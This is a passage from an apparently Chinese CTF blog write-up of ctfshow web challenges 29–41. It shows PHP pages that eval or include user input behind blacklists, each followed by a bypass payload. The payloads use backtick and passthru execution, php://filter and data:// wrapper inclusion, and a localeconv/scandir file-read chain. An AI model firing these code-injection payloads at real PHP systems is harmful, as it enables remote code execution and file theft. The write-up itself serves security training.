/></p>\n<p>就过滤了一个 flag，问号匹配一下绕过</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">system()\npassthru()\nexec()&#x2F;&#x2F;没有回显，返回最后一行\nshell_exec()&#x2F;&#x2F;没有返回结果<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>上面的函数都可以执行命令</p>\n<h2 id=\"web30\"><a class=\"anchor\" href=\"#web30\">#</a> web30</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"> <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|php/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>黑名单加入了 php 和 system，同上可绕过</p>\n<h2 id=\"web31\"><a class=\"anchor\" href=\"#web31\">#</a> web31</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|php|cat|sort|shell|\\.| |\\'/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>黑名单新加入 cat，sort，shell，.，'</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">?c&#x3D;echo%09&#96;tac%09fl*&#96;;\n?c&#x3D;passthru(&quot;tac%09f*&quot;);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p>这里也简单的解释一下 ctfshow 给的 payload</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_reverse</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">pos</span><span class=\"token punctuation\">(</span><span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 函数返回一包含本地数字及货币格式信息的数组。数组的第一项是’<span class=\"token operator\">.</span>‘\n<span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 函数会返回以下数组元素：\n<span class=\"token punctuation\">[</span>decimal_point<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> 小数点字符\n<span class=\"token punctuation\">[</span>thousands_sep<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> 千位分隔符\n<span class=\"token punctuation\">[</span>int_curr_symbol<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> 货币符号 （例如：<span class=\"token constant\">USD</span>）\n<span class=\"token punctuation\">[</span>currency_symbol<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> 货币符号 （例如：$）\n<span class=\"token punctuation\">[</span>mon_decimal_point<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> 货币小数点字符\n<span class=\"token punctuation\">[</span>mon_thousands_sep<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> 货币千位分隔符\n<span class=\"token punctuation\">[</span>positive_sign<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> 正值字符\n<span class=\"token punctuation\">[</span>negative_sign<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> 负值字符\n<span class=\"token punctuation\">[</span>int_frac_digits<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> 国际通用小数位\n<span class=\"token punctuation\">[</span>frac_digits<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> 本地通用小数位\n<span class=\"token punctuation\">[</span>p_cs_precedes<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> 如果货币符号在一个正数值之前显示，则为 <span class=\"token constant boolean\">True</span>（<span class=\"token number\">1</span>），如果在正数值之后显示，则为 <span class=\"token constant boolean\">False</span>（<span class=\"token number\">0</span>）\n<span class=\"token punctuation\">[</span>p_sep_by_space<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> 如果在货币符号和正数值之间包含空格，则为 <span class=\"token constant boolean\">True</span>（<span class=\"token number\">1</span>），否则为 <span class=\"token constant boolean\">False</span>（<span class=\"token number\">0</span>）\n<span class=\"token punctuation\">[</span>n_cs_precedes<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> 如果货币符号在一个负数值之前显示，则为 <span class=\"token constant boolean\">True</span>（<span class=\"token number\">1</span>），如果在负数值之后显示，则为 <span class=\"token constant boolean\">False</span>（<span class=\"token number\">0</span>）\n<span class=\"token punctuation\">[</span>n_sep_by_space<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> 如果在货币符号和负数值之间包含空格，则为 <span class=\"token constant boolean\">True</span>（<span class=\"token number\">1</span>），否则为 <span class=\"token constant boolean\">False</span>（<span class=\"token number\">0</span>）\n<span class=\"token punctuation\">[</span>p_sign_posn<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> 格式化选项：\n<span class=\"token number\">0</span> <span class=\"token operator\">-</span> 把数量和货币符号写在圆括号内\n<span class=\"token number\">1</span> <span class=\"token operator\">-</span> 在数量和货币符号之前加上 <span class=\"token operator\">+</span> 号\n<span class=\"token number\">2</span> <span class=\"token operator\">-</span> 在数量和货币符号之后加上 <span class=\"token operator\">+</span> 号\n<span class=\"token number\">3</span> <span class=\"token operator\">-</span> 直接在货币符号之前加上 <span class=\"token operator\">+</span> 号\n<span class=\"token number\">4</span> <span class=\"token operator\">-</span> 直接在货币符号之后加上 <span class=\"token operator\">+</span> 号\n<span class=\"token punctuation\">[</span>n_sign_posn<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> 格式化选项：\n<span class=\"token number\">0</span> <span class=\"token operator\">-</span> 把数量和货币符号写在圆括号内\n<span class=\"token number\">1</span> <span class=\"token operator\">-</span> 在数量和货币符号之前加上 <span class=\"token operator\">-</span> 号\n<span class=\"token number\">2</span> <span class=\"token operator\">-</span> 在数量和货币符号之后加上 <span class=\"token operator\">-</span> 号\n<span class=\"token number\">3</span> <span class=\"token operator\">-</span> 直接在货币符号之前加上 <span class=\"token operator\">-</span> 号\n<span class=\"token number\">4</span> <span class=\"token operator\">-</span> 直接在货币符号之后加上 <span class=\"token operator\">-</span> 号\n<span class=\"token punctuation\">[</span>grouping<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> 显示数字组合形式的数组（例如：<span class=\"token number\">3</span> 指示 <span class=\"token number\">1</span> <span class=\"token number\">000</span> <span class=\"token number\">000</span>）\n<span class=\"token punctuation\">[</span>mon_grouping<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> 显示货币数字组合形式的数组（例如：<span class=\"token number\">2</span> 指示 <span class=\"token number\">1</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span>）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221027113321559.png\" alt=\"image-20221027113321559\" /></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">pos</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token function\">current</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>返回数组第一个值<span class=\"token comment\">// 配合上面的 localeconv () 可以返回一个点</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221027114014169.png\" alt=\"image-20221027114014169\" /></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 函数返回指定目录中的文件和目录的数组。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221027113840633.png\" alt=\"image-20221027113840633\" /></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>数组指针指向最后一位\n<span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> 数组指针指向下一位\n<span class=\"token function\">array_reverse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> 将数组颠倒\n<span class=\"token function\">array_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> 随机返回数组的键名\n<span class=\"token function\">array_flip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>：交换数组的键和值\n读取文件：\n<span class=\"token function\">file_get_content</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> \n<span class=\"token function\">readfile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h2 id=\"web32\"><a class=\"anchor\" href=\"#web32\">#</a> web32</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>过滤限制加入了反引号、echo、;、(</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>过滤了括号，include 函数不需要括号</p>\n<h2 id=\"web37\"><a class=\"anchor\" href=\"#web37\">#</a> web37</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//flag in flag.php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token punctuation\">&#125;</span>\n        \n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>这已经知道 flag 在 flag.php 中了，利用伪协议读取 flag</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">1、php:&#x2F;&#x2F;input 可以访问请求的原始数据,配合文件包含漏洞可以将post请求体中的内容当做文件内容执行,从而实现任意代码执行\n可以获取POST的数据流\n2、php:&#x2F;&#x2F;filter\nphp:&#x2F;&#x2F;filter 协议可以对打开的数据流进行筛选和过滤,常用于读取文件源码\n可以获取指定文件的源码，但是当他与包含函数结合是，php:&#x2F;&#x2F;filter流会被当做php文件执行\n。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取\n4、data:&#x2F;&#x2F;\ndata:&#x2F;&#x2F;协议通过执行资源类型,使后面的内容当做文件内容来执行,从而造成任意代码执行\n同样类似于php:&#x2F;&#x2F;input<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D;\n\ndata:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&#39;cat fl?g.php&#39;);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre></p>\n<h2 id=\"web38\"><a class=\"anchor\" href=\"#web38\">#</a> web38</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"> <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//flag in flag.php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|php|file/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token punctuation\">&#125;</span>\n        \n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>增加了 php 和 file，还是使用 data 伪协议</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<h2 id=\"web39\"><a class=\"anchor\" href=\"#web39\">#</a> web39</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//flag in flag.php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n        \n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>有限制的文件包含，但是将 php 代码闭合即可</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&#39;tac fla?.php&#39;);?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<h2 id=\"web40\"><a class=\"anchor\" href=\"#web40\">#</a> web40</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\'|\\\"|\\,|\\&lt;|\\.|\\>|\\/|\\?|\\\\\\\\/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n        \n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>有限制的代码执行，我还在像这全都过滤了怎么解决，后来发现这个括号过滤的是中文的，那么就可以构造和 web31 一样的 payload</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>也可以使用 sessionID 来构造命令执行</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">session——start();system(session_id());\nID&#x3D;ls&#x2F;&#x2F;这里打开flag我没有测试成功，应该是php版本的问题，<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p>这里打开 flag 我没有测试成功，应该是 php 版本的问题，这里有报错显示字符只能是数字字母加下划线</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221029190103627.png\" alt=\"image-20221029190103627\" /></p>\n<h2 id=\"web41\"><a class=\"anchor\" href=\"#web41\">#</a> web41</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token 